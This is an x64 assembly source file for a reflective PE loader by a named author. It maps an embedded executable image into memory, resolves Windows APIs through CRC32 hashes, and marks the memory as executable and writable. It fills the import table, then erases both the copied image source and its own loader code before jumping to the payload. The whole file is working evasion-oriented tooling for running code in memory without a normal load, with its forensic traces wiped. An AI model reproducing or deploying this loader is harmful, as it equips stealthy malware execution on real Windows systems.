;#==============================================#
;# X64 Fixed Reflective Loader (No relocation)  #
;# Author: Ege Balcı <egebalci@pm.me>           #
;# Version: 1.1                                 #
;#==============================================#

[BITS 64]

	call start                      ; Get the address of pre-mapped PE image to stack
	incbin "pemap.bin"              ; Pre-mapped PE image
start:
	pop rsi                         ; Get the address of image to rsi
	call $+5
	sub [rsp],rsi                   ; Subtract the address of pre mapped PE image and get the image_size to R11
	mov rbp,rsp                     ; Copy current stack address to rbp
	and rbp,-0x1000                 ; Create a new shadow stack address
	mov eax,dword [rsi+0x3C]        ; Get the offset of "PE" to eax
	mov rbx,qword [rax+rsi+0x30]    ; Get the image base address to rbx
	mov r12d,dword [rax+rsi+0x28]   ; Get the address of entry point to r12
	push rax                        ; Allocate 8 bytes for lpflOldProtect
	mov r9,rsp                      ; lpflOldProtect
	mov r8d,dword 0x40              ; PAGE_EXECUTE_READWRITE
	mov rdx,qword [rsp+8]           ; dwSize
	mov rcx,rbx                     ; lpAddress
	mov r10d,0x80886EF1             ; crc32( "kernel32.dll", "VirtualProtect" )
	xchg rsp,rbp                    ; Swap shadow stack
	call api_call                   ; VirtualProtect( image_base, image_size, PAGE_EXECUTE_READWRITE, lpflOldProtect)
	xchg rsp,rbp                    ; Swap shadow stack
	xor rax,rax                     ; Zero EAX
	xor r14,r14                     ; Zero R14
	xor r15,r15                     ; Zero R15
	mov eax,dword [rsi+0x3C]        ; Offset to IMAGE_NT_HEADER ("PE")
	mov eax,dword [rax+rsi+0x90]    ; Import table RVA
	add rax,rsi                     ; Import table memory address (first image import descriptor)
	push rax                        ; Save import descriptor to stack
get_modules:
	cmp dword [rax],0               ; Check if the import names table RVA is NULL
	jz complete                     ; If yes building process is done
	mov ecx,dword [rax+0x0C]        ; Get RVA of dll name to eax
	add rcx,rsi                     ; Get the dll name address
	call LoadLibraryA               ; Load the library
	mov r13,rax                     ; Move the dll handle to R13
	mov rax,[rsp]                   ; Move the address of current _IMPORT_DESCRIPTOR to eax 
	call get_procs                  ; Resolve all windows API function addresses
	add dword [rsp],0x14            ; Move to the next import descriptor
	mov rax,[rsp]                   ; Set the new import descriptor address to RAX
	jmp get_modules
get_procs:
	mov r14d,dword [rax+0x10]       ; Save the current import descriptor IAT RVA to R14D
	add r14,rsi                     ; Get the IAT memory address 
	mov rax,[rax]                   ; Set the import names table RVA to RAX
	add rax,rsi                     ; Get the current import descriptor's import names table address	
	mov r15,rax                     ; Save &INT to R15
resolve: 
	cmp dword [rax],0               ; Check if end of the import names table
	jz all_resolved                 ; If yes resolving stage is done
	mov rax,[rax]                   ; Get the RVA of function hint to eax
	btr rax,0x3F                    ; Check if the high order bit is set
	jnc name_resolve                ; If high order bit is not set resolve with INT entry
	shl rax,2                       ; Discard the high bit by shifting
	shr rax,2                       ; Shift back the original value
	call GetProcAddress             ; Get API address with hint
	jmp insert_iat                  ; Insert the address of API to IAT
name_resolve:
	add rax,rsi                     ; Set the address of function hint
	add rax,2                       ; Move to function name
	call GetProcAddress             ; Get the function address to eax
insert_iat: 
	mov [r14],rax                   ; Insert the function address to IAT
	add r14,8                       ; Increase the IAT index
	add r15,8                       ; Increase the import names table index
	mov rax,r15                     ; Set the address of import names table address to RAX
	jmp resolve                     ; Loop
all_resolved:
	mov qword [r14],0               ; Insert a NULL qword
	ret                             ; <-
LoadLibraryA:
	xchg rbp,rsp                    ; Swap shadow stack
	mov r10d,0xE2E6A091             ; hash( "kernel32.dll", "LoadLibraryA" )
	call api_call                   ; LoadLibraryA(RCX)
	xchg rbp,rsp                    ; Swap shadow stack
	ret                             ; <-
GetProcAddress:
	xchg rbp,rsp                    ; Swap shadow stack
	mov rcx,r13                     ; Move the module handle to RCX as first parameter
	mov rdx,rax                     ; Move the address of function name string to RDX as second parameter
	mov r10d,0xA18B0B38             ; hash( "kernel32.dll", "GetProcAddress" )
	call api_call                   ; GetProcAddress(RCX,RDX)
	xchg rbp,rsp                    ; Swap shadow stack
	ret                             ; <-
complete:
	pop rax                         ; Clean out the stack
	pop rax                         ; ...
	pop rcx                         ; Pop the image_size to RCX
	push rbx                        ; Push the new base adress to stack
	add [rsp],r12                   ; Add the address of entry value to new base address
memcpy:	
	mov al,[rsi]                    ; Move 1 byte of PE image to AL register
	mov byte [rbx],al               ; Move 1 byte of PE image to image base
	mov byte [rsi],0                ; Overwrite copied byte (for less memory footprint)
	inc rsi                         ; Increase PE image index
	inc rbx                         ; Increase image base index
	loop memcpy                     ; Loop until zero
	jmp PE_start

; ========== API ==========
%include "CRC32_API/x64_crc32_api.asm"

PE_start:
  mov rcx,wipe                    ; Get the number of bytes until wipe label
  lea rax,[rip]                   ; Get RIP to RAX
  nop                             ; Padding
wipe:
  mov byte [rax],0                ; Wipe 1 byte at a time
  dec rax                         ; Decraise RAX
  loop wipe                       ; Loop until RCX = 0
  ret                             ; Return to AOE